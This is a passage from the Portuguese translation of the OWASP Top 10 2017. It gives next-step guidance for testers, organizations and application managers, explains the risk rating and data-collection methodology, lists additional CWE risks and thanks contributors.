<p>Para ajudar as organizações e os programadores a reduzirem os seus riscos de segurança de aplicações de uma forma efetiva, a OWASP produziu numerosos recursos livres e gratuitos que podem ser usados para endereçar a segurança de aplicações na sua organização. Os seguintes são alguns dos muitos recursos que a OWASP produziu para ajudar as organizações a produzir aplicações Web e APIs seguras. Na próxima página apresentamos recursos adicionais da OWASP que podem ajudar as organizações a verificar a segurança das suas aplicações e APIs.</p>
<table>
<thead>
<tr class="header">
<th>Atividade</th>
<th>Descrição</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Requisitos de Segurança de Aplicação</td>
<td>Para produzir uma aplicação Web segura, você deve definir o que significa ser segura para essa aplicação. A OWASP recomenda que você use o <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard (ASVS)</a>, como um guia para configurar os requisitos de segurança para suas aplicações. Se você estiver terceirizando, considere o <a href="https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex">OWASP Secure Software Contract Annex</a>. <strong>Nota</strong>: O anexo é para lei de contratos dos EUA, por isso, consulte aconselhamento jurídico qualificado antes de usar a amostra do anexo.</td>
</tr>
<tr class="even">
<td>Arquitetura de segurança de aplicações</td>
<td>Em vez de adaptar a segurança em suas aplicações e APIs, é muito mais econômico projetar a segurança desde o início. OWASP recomenda o <a href="https://cheatsheetseries.owasp.org/">OWASP Prevention Cheat Sheets</a> como um bom ponto de partida para orientação sobre como construir segurança desde o início.</td>
</tr>
<tr class="odd">
<td>Controles de Padrões de Segurança</td>
<td>Construir controles de segurança fortes e utilizáveis é difícil. O uso de um conjunto de controles de segurança padrão simplifica radicalmente o desenvolvimento de aplicativos e APIs seguros. O <a href="https://cheatsheetseries.owasp.org/">OWASP Prevention Cheat Sheets</a> é um bom ponto de partida para desenvolvedores, e muitos frameworks modernos agora possuem controles de segurança padrão e efetivos para autorização, validação, CSRF , etc.</td>
</tr>
<tr class="even">
<td>Ciclo de Vida de Desenvolvimento Seguro</td>
<td>Para melhorar o processo que sua organização segue ao criar aplicações e APIs, o OWASP recomenda <a href="https://owasp.org/www-project-samm/">OWASP Software Assurance Maturity Model (SAMM)</a>. Este modelo ajuda as organizações a formular e implementar uma estratégia de segurança de software adaptada aos riscos específicos de sua organização.</td>
</tr>
<tr class="odd">
<td>Educação de segurança de aplicativos</td>
<td>O <a href="https://owasp.org/www-committee-education-and-training/">OWASP Education Committee</a> fornece materiais de treinamento para ajudar a educar os desenvolvedores na segurança das aplicações web. Para aprender sobre as vulnerabilidades, experimente <a href="https://owasp.org/www-project-webgoat/">OWASP WebGoat</a>, <a href="https://github.com/jerryhoff/WebGoat.NET">WebGoat.NET</a>, <a href="https://owasp.org/www-project-node.js-goat/">OWASP NodeJS Goat</a>, <a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop Project</a> ou <a href="https://github.com/chuckfw/owaspbwa/">OWASP Broken Web Applications Project</a>. Para manter-se atualizado, venha a uma <a href="https://owasp.org/events/">Conferência OWASP AppSec</a>, <a href="https://owasp.org/events/">OWASP Conference Training</a> ou a alguma <a href="https://owasp.org/chapters/">Reunião do OWASP Chapter </a> local.</td>
</tr>
</tbody>
</table>
<p>Existem inúmeros recursos OWASP adicionais disponíveis para seu uso. Visite a página <a href="https://owasp.org/projects/">OWASP Projects</a>, que lista todos os projetos Flagship, Labs e Incubator do inventário do OWASP. A maioria dos recursos do OWASP estão disponíveis no nosso <a href="https://owasp.org/">wiki</a> e muitos documentos do OWASP podem ser encomendados em <a href="https://stores.lulu.com/owasp">cópias impressas ou como livros eletrônicos</a>.</p>
<h1 id="t-próximos-passos-para-testadores-de-segurança">+T Próximos Passos para Testadores de Segurança</h1>
<h2 id="estabeleça-testes-contínuos-de-segurança-de-aplicações">Estabeleça Testes Contínuos de Segurança de Aplicações</h2>
<p>Construir código seguro é importante. Mas é fundamental verificar se a segurança que você pretende construir é realmente vigente, corretamente implementada e usada em todos os lugares em que deveria ser. O objetivo do teste de segurança de aplicação é fornecer essa evidência. O trabalho é difícil e complexo, e os modernos processos de desenvolvimento de alta velocidade, como Agile e DevOps, colocaram extrema pressão sobre abordagens e ferramentas tradicionais. Por isso, encorajamos fortemente você a pensar sobre como se concentrará no que é importante em todo o seu portfólio de aplicações, e faça isso de forma economicamente viável.</p>
<p>Os riscos modernos mudam rapidamente, então a época de testes de verificação ou penetração de uma aplicação para vulnerabilidades uma vez por ano, já se foi faz tempo. O desenvolvimento de software moderno exige testes contínuos de segurança de aplicações durante todo o ciclo de vida do desenvolvimento de software. Procure aprimorar as tubulações de desenvolvimento existentes com automação de segurança que não diminua o desenvolvimento. Seja qual for a abordagem que você escolher, considere o custo anual para testar, triar, corrigir, retestar e reimplantar uma única aplicação, multiplicada pelo tamanho do portfólio de aplicações.</p>
<table>
<thead>
<tr class="header">
<th>Atividade</th>
<th>Descrição</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Compreenda o modelo da ameaça</td>
<td>Antes de começar a testar, certifique-se de entender no que é importante investir o tempo. As prioridades vêm do modelo de ameaça, então, se você não possui um, você precisa criar um antes de testar. Considere o uso de <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP ASVS</a> e o <a href="https://owasp.org/www-project-web-security-testing-guide/">Guia de Testes OWASP</a> como entrada e não se apoie em fornecedores de ferramentas para decidir o que é importante para o seu negócio.</td>
</tr>
<tr class="even">
<td>Compreenda o ciclo de desenvolvimento de software</td>
<td>Sua abordagem de testes de segurança de aplicações deve ser altamente compatível com as pessoas, processos e ferramentas que você usa no seu ciclo de vida de desenvolvimento de software (SDLC). Tentativas de forçar passos, portas e revisões adicionais provavelmente causam atrito, são ignoradas e exigem esforço para escalar. Procure oportunidades naturais para reunir informações de segurança e alimentá-lo de volta ao seu processo.</td>
</tr>
<tr class="odd">
<td>Estratégias de teste</td>
<td>Escolha a técnica mais simples, mais rápida e precisa para verificar cada requisito. O <a href="https://owasp.org/www-project-security-knowledge-framework/">Framework de Conhecimento de Segurança OWASP</a> e <a href="https://owasp.org/www-project-application-security-verification-standard/">Padrão de Verificação de Segurança de Aplicações OWASP (ASVS)</a> podem sejam ótimas fontes de requisitos de segurança funcionais e não funcionais nos seus testes unitários e de integração. Certifique-se de considerar os recursos humanos necessários para lidar com falsos positivos a partir do uso de ferramentas automatizadas, bem como os graves perigos de falsos negativos.</td>
</tr>
<tr class="even">
<td>Alcançando Cobertura e Precisão</td>
<td>Você não precisa começar a testar tudo. Concentre-se no que é importante e expanda seu programa de verificação ao longo do tempo. Isso significa expandir o conjunto de defesas e riscos de segurança que estão sendo verificados automaticamente, além de expandir o conjunto de aplicações e APIs cobertos. O objetivo é alcançar um estado em que a segurança essencial de todas as suas aplicações e APIs seja verificada continuamente.</td>
</tr>
<tr class="odd">
<td>Fazendo Descobertas impressionantes</td>
<td>Não importa o quão bom você esteja testando, não fará qualquer diferença a menos que você se comunique de forma eficaz. Crie confiança mostrando que você entende como a aplicação funciona. Descreva claramente como isso pode ser abusado sem "dialetos" e inclua um cenário de ataque para torná-lo real. Faça uma estimativa realista de quão difícil é descobrir e explorar a vulnerabilidade e quão ruim seria. Finalmente, forneça resultados nas ferramentas que as equipes de desenvolvimento já estão usando, e não arquivos PDF.</td>
</tr>
</tbody>
</table>
<h1 id="o-próximos-passos-para-organizações">+O Próximos Passos para Organizações</h1>
<h2 id="comece-seu-programa-de-segurança-de-aplicações-agora">Comece seu programa de segurança de aplicações agora</h2>
<p>Segurança de aplicações não é mais algo opcional. Entre os ataques crescentes e as pressões regulatórias, as organizações devem estabelecer processos e capacidades eficazes para garantir suas aplicações e APIs. Dada a incrível quantidade de código nas inúmeras aplicações e APIs já em produção, muitas organizações estão lutando para lidar com o enorme volume de vulnerabilidades.</p>
<p>OWASP recomenda que as organizações estabeleçam um programa de segurança de aplicações para obter informações e melhorar a segurança em suas aplicações e portfólio de APIs. Alcançar a segurança de aplicações exige que muitas partes diferentes de uma organização trabalhem em conjunto de forma eficiente, incluindo segurança e auditoria, desenvolvimento de software, negócios e gerenciamento executivo. A segurança deve ser visível e mensurável, para que todos os diferentes jogadores possam ver e entender a postura de segurança de aplicações da organização. Concentre-se nas atividades e nos resultados que realmente ajudam a melhorar a segurança empresarial, eliminando ou reduzindo o risco. OWASP SAMM fornece muitas orientações neste espaço e é a fonte da maioria das principais atividades:</p>
<h3 id="comece-já">Comece Já</h3>
<ul>
<li>Documente todos as aplicações e recursos de dados associados. Organizações maiores devem considerar a implementação de um banco de dados de gerenciamento de configuração (CMDB) para esse propósito.</li>
<li>Estabeleça um <a href="https://owasp.org/www-project-samm/">programa de segurança de aplicações</a> e direcione a adoção.</li>
<li>Conduza uma <a href="https://owasp.org/www-project-samm/">análise de lacunas de capacitação</a> comparando sua organização com seus pares para definir áreas chave de melhoria e um plano de execução.</li>
<li>Obtenha aprovação de gerenciamento e estabeleça uma <a href="https://owasp.org/www-project-samm/">campanha de conscientização de segurança de aplicações</a> para toda a organização de TI.</li>
</ul>
<h3 id="abordagem-de-portfólio-baseado-em-risco">Abordagem de portfólio Baseado em Risco</h3>
<ul>
<li>Identifique as <a href="https://owasp.org/www-project-samm/">necessidades de proteção</a> do seu <a href="https://owasp.org/www-project-samm/">portfólio de aplicações</a> sob uma perspectiva de negócios. Isso deve ser conduzido em parte pelas leis de privacidade e outros regulamentos relevantes para a posse de dados que está sendo protegida.</li>
<li>Estabeleça um <a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">modelo comum de classificação de risco</a> com um conjunto consistente de fatores de probabilidade e impacto refletindo a tolerância de sua organização para o risco.</li>
<li>De forma adequada, meça e priorize todas as suas aplicações e APIs. Adicione os resultados ao seu CMDB.</li>
<li>Estabeleça diretrizes de garantia para definir corretamente a cobertura e o nível de rigor exigido.</li>
</ul>
<h3 id="promova-uma-fundação-forte">Promova uma Fundação Forte</h3>
<ul>
<li>Estabeleça um <a href="https://owasp.org/www-project-samm/">conjunto de políticas e padrões</a> focado que forneça uma linha base de segurança de aplicações para todas as equipes de desenvolvimento aderirem.</li>
<li>Defina um conjunto comum de <a href="https://owasp.org/www-project-security-knowledge-framework/">controles de segurança reutilizáveis</a> que complementem essas políticas e padrões e forneçam orientação de design e desenvolvimento sobre seu uso.</li>
<li>Estabeleça um <a href="https://owasp.org/www-project-samm/">currículo de treinamento de segurança de aplicações</a> que é necessário e direcionado para diferentes papéis e tópicos de desenvolvimento.</li>
</ul>
<h3 id="integre-a-segurança-em-processos-existentes">Integre a segurança em processos existentes</h3>
<ul>
<li>Defina e integre atividades de <a href="https://owasp.org/www-project-samm/">implementação segura</a> em processos de desenvolvimento e operação existentes.</li>
<li>As atividades devem incluir <a href="https://owasp.org/www-project-samm/">modelagem de ameaças</a> e remediação.</li>
<li>Forneça especialistas e <a href="https://owasp.org/www-project-samm/">serviços de suporte para equipes de desenvolvimento e projeto</a> para ter sucesso.</li>
</ul>
<h3 id="forneça-visibilidade-de-gerenciamento">Forneça visibilidade de gerenciamento</h3>
<ul>
<li>Gerencie com métricas. Gerencie decisões de melhoria e financiamento com base nas métricas e dados de análise capturados. As métricas incluem aderência a práticas / atividades de segurança, vulnerabilidades introduzidas, vulnerabilidades mitigadas, cobertura de aplicativos, densidade de defeito por tipo e contagem de instâncias, etc.</li>
<li>Analise dados das atividades de implementação e verificação para procurar padrões de causa e vulnerabilidade raiz para gerar melhorias estratégicas e sistêmicas em toda a empresa. Aprenda com os erros e ofereça incentivos positivos para promover melhorias</li>
</ul>
<h1 id="a-próximos-passos-para-gerente-de-aplicações">+A: Próximos Passos para Gerente de Aplicações</h1>
<h2 id="gerencie-o-ciclo-de-vida-completo-da-aplicação">Gerencie o Ciclo de Vida Completo da Aplicação</h2>
<p>Aplicações estão entre os sistemas mais complexos que os seres humanos criam e mantêm regularmente. O gerenciamento de TI para uma aplicação deve ser realizado por especialistas de TI que são responsáveis pelo ciclo geral de TI de uma aplicação. Sugerimos estabelecer o papel de gerente de aplicações como contrapartida técnica para o dono da aplicação. O gerente de aplicações está encarregado de todo o ciclo de vida da aplicação sob a perspectiva de TI desde coletar os requisitos até o processo de aposentadoria de sistemas, que muitas vezes é ignorado.</p>
<h2 id="requisitos-e-gerenciamento-de-recursos">Requisitos e Gerenciamento de Recursos</h2>
<ul>
<li>Colete e negocie os requisitos de negócios para uma aplicação com o negócio, incluindo os requisitos de proteção em relação à confidencialidade, autenticidade, integridade e disponibilidade de todos os ativos de dados e a lógica comercial esperada.</li>
<li>Compile os requisitos técnicos, incluindo requisitos de segurança funcionais e não funcionais.</li>
<li>Planeje e negocie o orçamento que abrange todos os aspectos do projeto, construção, teste e operação, incluindo atividades de segurança.</li>
</ul>
<h2 id="pedido-de-propostas-rfp-e-contratação">Pedido de Propostas (RFP) e Contratação</h2>
<ul>
<li>Negocie com desenvolvedores internos ou externos os requisitos, incluindo diretrizes e requisitos de segurança em relação ao seu programa de segurança, por exemplo, SDLC, melhores práticas.</li>
<li>Avalie o cumprimento de todos os requisitos técnicos, incluindo uma fase de planejamento e design.</li>
<li>Negocie todos os requisitos técnicos, incluindo acordos de design, segurança e nível de serviço (SLA).</li>
<li>Adote modelos e listas de verificação, como <a href="https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex">Anexo de Contrato de Software Seguro OWASP</a>. <strong>Nota</strong>: O Anexo é uma amostra específica da lei de contratos dos EUA e é provável que necessite de revisão legal em sua jurisdição. Consulte conselhos legais qualificados antes de usar o Anexo</li>
</ul>
<h2 id="planejamento-e-design">Planejamento e Design</h2>
<ul>
<li>Negocie planejamento e design com os desenvolvedores e acionistas internos, por exemplo especialistas em segurança.</li>
<li>Defina a arquitetura de segurança, controles e contramedidas apropriadas às necessidades de proteção e ao nível de ameaça esperado. Isso deve ser suportado por especialistas em segurança.</li>
<li>Certifique-se de que o proprietário do aplicativo aceita os riscos remanescentes ou fornece recursos adicionais.</li>
<li>Em cada sprint, garantir que as histórias de segurança sejam criadas, incluindo restrições adicionadas para requisitos não funcionais.</li>
</ul>
<h2 id="deployment-testes-e-rollout"><em>Deployment</em>, Testes e <em>Rollout</em></h2>
<ul>
<li>Automatize o <em>deploy</em> seguro do aplicativo, interfaces e de todos os componentes necessários, incluindo as autorizações necessárias.</li>
<li>Teste as funções técnicas e integração com a arquitetura de TI e coordene os testes de negócios.</li>
<li>Crie casos de teste de "uso" e "abuso" de perspectivas técnicas e empresariais.</li>
<li>Gerencie testes de segurança de acordo com os processos internos, as necessidades de proteção e o nível de segurança exigido pelo aplicativo.</li>
<li>Coloque o aplicativo em operação e migre dos aplicativos usados anteriormente, se necessário.</li>
<li>Finalize toda a documentação, incluindo o CMDB e arquitetura de segurança.</li>
</ul>
<h2 id="operação-e-mudanças">Operação e Mudanças</h2>
<ul>
<li>Opere incluindo o gerenciamento de segurança para a aplicação (por exemplo, gerenciamento de patches).</li>
<li>Promova a consciência de segurança dos usuários e gerencie conflitos sobre usabilidade vs segurança.</li>
<li>Planeje e gerencie mudanças, por exemplo, migre para novas versões da aplicação ou outros componentes como SO, middleware e bibliotecas.</li>
<li>Atualize toda a documentação, inclusive no CMDB e na arquitetura de segurança, controles e contramedidas, incluindo qualquer procedimento ou documentação do projeto.</li>
</ul>
<h2 id="aposentando-sistemas">Aposentando Sistemas</h2>
<ul>
<li>Todos os dados necessários devem ser arquivados. Todos os outros dados devem ser totalmente apagados.</li>
<li>Retire com segurança a aplicação, incluindo a exclusão de contas e funções não utilizadas e permissões.</li>
<li>Defina o estado da sua aplicação a ser aposentada no CMDB.</li>
</ul>
<h1 id="r-notas-sobre-riscos">+R Notas Sobre Riscos</h1>
<h2 id="é-sobre-os-riscos-que-as-vulnerabilidades-representam">É Sobre os Riscos Que as Vulnerabilidades Representam</h2>
<p>A metodologia de classificação de risco para o Top 10 é baseada na <a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">Metodologia de Classificação de Risco OWASP</a>. Para cada categoria de Top 10, estimamos o risco típico de que cada vulnerabilidade introduz em uma aplicação web típica, observando fatores de probabilidade comuns e fatores de impacto para cada vulnerabilidade comum. Em seguida, ordenamos o Top 10 de acordo com essas vulnerabilidades que tipicamente apresentam o risco mais significativo para uma aplicação. Esses fatores são atualizados com cada novo lançamento do Top 10 à medida que as coisas mudam e evoluem.</p>
<p>A <a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">Metodologia de Classificação de Risco OWASP</a> define numerosos fatores para ajudar a calcular o risco de uma vulnerabilidade identificada. No entanto, o Top 10 deve falar sobre generalidades, em vez de vulnerabilidades específicas em aplicações reais e APIs. Conseqüentemente, nunca podemos ser tão precisos como os proprietários do sistema podem ser ao calcular riscos para suas aplicações. Você está melhor equipado para avaliar a importância de suas aplicações e dados, quais são suas ameaças e como seu sistema foi criado e está sendo operado.</p>
<p>Nossa metodologia inclui três fatores de probabilidade para cada vulnerabilidade (prevalência, detectabilidade e facilidade de exploração) e um fator de impacto (impacto técnico). As escalas de risco para cada fator variam de 1-Baixo a 3-Alto com terminologia específica para cada fator. A prevalência de uma vulnerabilidade é um fator que você geralmente não precisa calcular. Para dados de prevalência, foram fornecidas estatísticas de prevalência de várias organizações diferentes (como referenciado nos Agradecimentos na página 25) e agregamos seus dados juntos para apresentar uma lista de probabilidade de existência de Top 10 por prevalência. Estes dados foram então combinados com os outros dois fatores de probabilidade (detectabilidade e facilidade de exploração) para calcular uma classificação de probabilidade para cada vulnerabilidade. A classificação de probabilidade foi então multiplicada pelo nosso impacto técnico médio estimado para cada item para chegar a uma classificação geral de risco para cada item no Top 10 (quanto maior o resultado, mais alto o risco). A detecção, a facilidade de exploração e o impacto foram calculados a partir da análise de CVEs relatados que foram associados a cada uma das categorias do Top 10.</p>
<p><strong>Nota</strong>: Esta abordagem não leva em conta a probabilidade do agente da ameaça. Também não conta nenhum dos vários detalhes técnicos associados à sua aplicação específica. Qualquer um desses fatores poderia afetar significativamente a probabilidade geral de um atacante encontrar e explorar uma vulnerabilidade particular. Esta classificação não leva em consideração o impacto real em sua empresa. Sua organização terá que decidir quanto risco de segurança de aplicações e APIs a organização está disposta a aceitar, dada a sua cultura, indústria e ambiente regulatório. A finalidade do OWASP Top 10 não é fazer esta análise de risco para você.</p>
<p>O seguinte ilustra o nosso cálculo do risco de <strong>A6:2017 - Configuração Incorreta de Segurança</strong></p>
<p><img src="images/0xc0-risk-explanation.png" alt="Cálculo de Risco para A6:2017-Configuração Incorreta de Segurança" /></p>
<h1 id="rf-detalhes-sobre-fatores-de-risco">+RF Detalhes Sobre Fatores de Risco</h1>
<h2 id="resumo-de-fator-de-risco-dos-top-10">Resumo de Fator de Risco dos Top 10</h2>
<p>A tabela a seguir apresenta um resumo dos Top 10 Riscos de Segurança de Aplicações de 2017 e os fatores de risco que atribuímos a cada risco. Esses fatores foram determinados com base nas estatísticas disponíveis e na experiência da equipe OWASP Top 10. Para entender esses riscos para uma determinada aplicação ou organização, você deve considerar seus próprios agentes de ameaças específicos e impactos comerciais. Mesmo as fraquezas mais graves de software podem não representar um risco grave se não houver agentes de ameaça em condições de realizar o ataque necessário ou o impacto comercial seja insignificante para os ativos envolvidos.</p>
<p><img src="images/0xc1-risk-factor-table.png" alt="Tabela de Fatores de Risco" /></p>
<h2 id="riscos-adicionais-a-considerar">Riscos adicionais a considerar</h2>
<p>O Top 10 cobre um monte de terreno, mas há muitos outros riscos que você deve considerar e avaliar em sua organização. Alguns deles apareceram em versões anteriores do Top 10 e outros não, incluindo novas técnicas de ataque que estão sendo identificadas o tempo todo. Outros riscos de segurança de aplicações importantes (ordenados por CWE-ID) que você também deve considerar incluir:</p>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion', 'AppDoS')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/451.html">CWE-451: User Interface (UI) Misrepresentation of Critical Information (Clickjacking and others)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: Unvalidated Forward and Redirects</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/799.html">CWE-799: Improper Control of Interaction Frequency (Anti-Automation)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere (3rd Party Content)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li>
</ul>
<h1 id="dat-metodologia-e-dados">+Dat Metodologia e Dados</h1>
<p>No evento <em>OWASP Project Summit</em>, os participantes ativos e os membros da comunidade decidiram em uma visão de vulnerabilidade, com até duas (2) classes de vulnerabilidades avançadas, com ordens definidas parcialmente por dados quantitativos e parcialmente por pesquisas qualitativas.</p>
<h2 id="pesquisa-classificada-à-indústria">Pesquisa Classificada à Indústria</h2>
<p>Para a pesquisa, nós coletamos as categorias de vulnerabilidade que foram previamente identificadas como sendo "de ponta" ou foram mencionadas em comentários para 2017 RC1 na lista de endereços do Top 10. Nós as colocamos em uma pesquisa classificada e pedimos aos entrevistados que classificassem as quatro principais vulnerabilidades que sentiram que deveriam ser incluídas no OWASP Top 10-2017. A pesquisa foi aberta de 2 de agosto a 18 de setembro de 2017. Foram coletadas 516 respostas e as vulnerabilidades foram classificadas.</p>
<table>
<thead>
<tr class="header">
<th>Classificação</th>
<th>Categoria de Vulnerabilidade na Pesquisa</th>
<th>Pontos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>Exposição de Informações Privadas ('Violação de Privacidade') [CWE-359]</td>
<td>748</td>
</tr>
<tr class="even">
<td>2</td>
<td>Falhas Criptográficas [CWE-310/311/312/326/327]</td>
<td>584</td>
</tr>
<tr class="odd">
<td>3</td>
<td>Deserialização de Dados Não Confiáveis [CWE-502]</td>
<td>514</td>
</tr>
<tr class="even">
<td>4</td>
<td>Bypass de Autorização Através de Chave Controlada Pelo Usuário (IDOR &amp; Path Traversal) [CWE-639]</td>
<td>493</td>
</tr>
<tr class="odd">
<td>5</td>
<td>Logs e monitoração insuficientes [CWE-223 / CWE-778]</td>
<td>440</td>
</tr>
</tbody>
</table>
<p>A Exposição de Informações Privadas é claramente a vulnerabilidade de maior ranking, mas se encaixa muito facilmente como uma ênfase adicional em <strong>A3:2017-Exposição de Dados Sensíveis</strong>. As falhas criptográficas podem caber dentro da Exposição de Dados Sensíveis. A deserialização insegura foi classificada em terceiro lugar, então foi adicionada ao Top 10 como <strong>A8:2017-Desserialização Insegura</strong> após avaliação de risco. Em quarto lugar, Chave Controlada Pelo Usuário está incluída em <strong>A5:2017-Falha no Controle de Acesso</strong>; é bom vê-lo com classificação alta na pesquisa, pois não há muitos dados relativos a vulnerabilidades de autorização. A categoria classificada em quinto lugar na pesquisa é Logs e Monitoração Insuficientes, que acreditamos ser uma boa opção para a lista Top 10, e é por isso que se tornou <strong>A10:2017 - Logs e Monitoração Insuficientes</strong>. Nós mudamos para um ponto em que as aplicações precisam ser capazes de definir o que pode ser um ataque e gerar logs, alertas, escalada e respostas adequadas.</p>
<h2 id="chamada-pública-de-dados">Chamada Pública de Dados</h2>
<p>Tradicionalmente, os dados coletados e analisados eram mais na linha de freqüência de dados; quantas vulnerabilidades encontradas em aplicações testados. Como é sabido, as ferramentas tradicionalmente relatam todas as instâncias encontradas de uma vulnerabilidade e os seres humanos tradicionalmente relatam uma única descoberta com uma série de exemplos. Isso torna muito difícil agregar os dois estilos de relatórios de maneira comparável.</p>
<p>Para 2017, a taxa de incidência foi calculada por quantas aplicações em um conjunto de dados possuíam um ou mais de um tipo específico de vulnerabilidade. Os dados de muitos contribuidores maiores foram fornecidos em duas visualizações: o primeiro foi o tradicional estilo de freqüência de contar todas as instâncias encontradas de uma vulnerabilidade, a segunda foi a contagem de aplicações em que cada vulnerabilidade foi encontrada (uma ou mais vezes). Embora não seja perfeito, isso permite-nos razoavelmente comparar os dados de Ferramentas Auxiliadas por Humanos e Humanos Auxiliados por Ferramenta. O trabalho de análise e dados brutos está <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall">disponível no GitHub</a>. Pretendemos expandir isso com estrutura adicional para futuras versões do Top 10.</p>
<p>Recebemos mais de 40 envios na chamada de dados, já que muitos eram da chamada de dados original que estava focada na freqüência, conseguimos usar dados de 23 contribuidores cobrindo ~114.000 aplicações. Usamos um período de um ano quando possível e identificado pelo contribuidor. A maioria das aplicações é única, embora reconheçamos a probabilidade de algumas aplicações repetidas entre os dados anuais da Veracode. Os 23 conjuntos de dados utilizados foram identificados como testes humanos auxiliados por ferramenta ou taxa de incidência especificamente fornecida por ferramentas auxiliadas por humanos. As anomalias nos dados selecionados de incidência de mais de 100% foram ajustadas até 100% no máximo. Para calcular a taxa de incidência, calculamos a porcentagem do total de aplicações que foram encontrados para conter cada tipo de vulnerabilidade. A classificação de incidência foi utilizada para o cálculo da prevalência no risco geral para classificar o Top 10.</p>
<h1 id="reconhecimentos">Reconhecimentos</h1>
<h2 id="reconhecimento-a-quem-contribuiu-com-dados">Reconhecimento a quem contribuiu com dados</h2>
<p>Gostaríamos de agradecer a muitas organizações que contribuíram com os seus dados de vulnerabilidades que sustentaram esta atualização de 2017:</p>
<ul>
<li>ANCAP</li>
<li>AsTech Consulting</li>
<li>Aspect Security</li>
<li>Atos</li>
<li>BUGemot</li>
<li>Bugcrowd</li>
<li>Branding Brand</li>
<li>CDAC</li>
<li>Checkmarx</li>
<li>Colegio LaSalle Monteria</li>
<li>Company.com</li>
<li>ContextIS</li>
<li>Contrast Security</li>
<li>DDoS.com</li>
<li>Derek Weeks</li>
<li>EVRY</li>
<li>EZI</li>
<li>Easybss</li>
<li>Edgescan</li>
<li>Hamed</li>
<li>Hidden</li>
<li>I4 Consulting</li>
<li>iBLISS Seguran̤a &amp; Intelig̻ncia</li>
<li>ITsec Security Services bv</li>
<li>Khallagh</li>
<li>Linden Lab</li>
<li>M. Limacher IT Dienstleistungen</li>
<li>Micro Focus Fortify</li>
<li>Minded Security</li>
<li>National Center for Cyber Security Technology</li>
<li>Network Test Labs Inc.</li>
<li>Osampa</li>
<li>Paladion Networks</li>
<li>Purpletalk</li>
<li>SHCP</li>
<li>Secure Network</li>
<li>Shape Security</li>
<li>Softtek</li>
<li>Synopsis</li>
<li>TCS</li>
<li>Vantage Point</li>
<li>Veracode</li>
<li>Web.com</li>
</ul>
<p>Pela primeira vez, todos os dados contribuídos para uma versão do Top 10, e a lista completa de contribuidores, é <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall/submissions">tornada pública</a>.</p>
<h2 id="reconhecimento-a-contribuidores-individuais">Reconhecimento a contribuidores individuais</h2>
<p>Gostaríamos de agradecer aos contribuidores individuais que investiram muitas horas contribuindo coletivamente para esta versão do Top 10 no GitHub.</p>
<ul>
<li>ak47gen</li>
<li>alonergan</li>
<li>ameft</li>
<li>anantshri</li>
<li>bandrzej</li>
<li>bchurchill</li>
<li>binarious</li>
<li>bkimminich</li>
<li>Boberski</li>
<li>borischen</li>
<li>Calico90</li>
<li>chrish</li>
<li>clerkendweller</li>
<li>D00gs</li>
<li>davewichers</li>
<li>drkknight</li>
<li>drwetter</li>
<li>ecbftw</li>
<li>einsweniger</li>
<li>ekobrin</li>
<li>eoftedal</li>
<li>frohoff</li>
<li>fzipi</li>
<li>gebl</li>
<li>gilzow</li>
<li>global4g</li>
<li>grnd</li>
<li>h3xstream</li>
<li>hiralph</li>
<li>HoLyVieR</li>
<li>ilatypov</li>
<li>irbishop</li>
<li>itscooper</li>
<li>ivanr</li>
<li>jeremylong</li>
<li>jhaddix</li>
<li>jmanico</li>
<li>joaomatosf</li>
<li>jrmithdobbs</li>
<li>jsteven</li>
<li>jvehent</li>
<li>kerberosmansour</li>
<li>koto</li>
<li>m8urnett</li>
<li>mwcoates</li>
<li>neo00</li>
<li>nickthetait</li>
<li>ninedter</li>
<li>ossie-git</li>
<li>PauloASilva</li>
<li>PeterMosmans</li>
<li>pontocom</li>
<li>psiinon</li>
<li>pwntester</li>
<li>raesene</li>
<li>riramar</li>
<li>ruroot</li>
<li>securestep9</li>
<li>SPoint42</li>
<li>sreenathsasikumar</li>
<li>starbuck3000</li>
<li>stefanb</li>
<li>sumitagarwalusa</li>
<li>taprootsec</li>
<li>tghosth</li>
<li>thesp0nge</li>
<li>toddgrotenhuis</li>
<li>tsohlacol</li>
<li>vdbaan</li>
<li>yohgaki</li>
</ul>
<p>E todos os outros que forneceram comentários via Twitter, e-mail e outros meios.</p>
<p>Seria imperdoável não mencionar que Dirk Wetter, Jim Manico e Osama Elnaggar prestaram ampla assistência. Além disso, Chris Frohoff e Gabriel Lawrence forneceram um apoio inestimável na redação do novo risco A8:2017-Desserialização Insegura.</p>
</body>
</html>
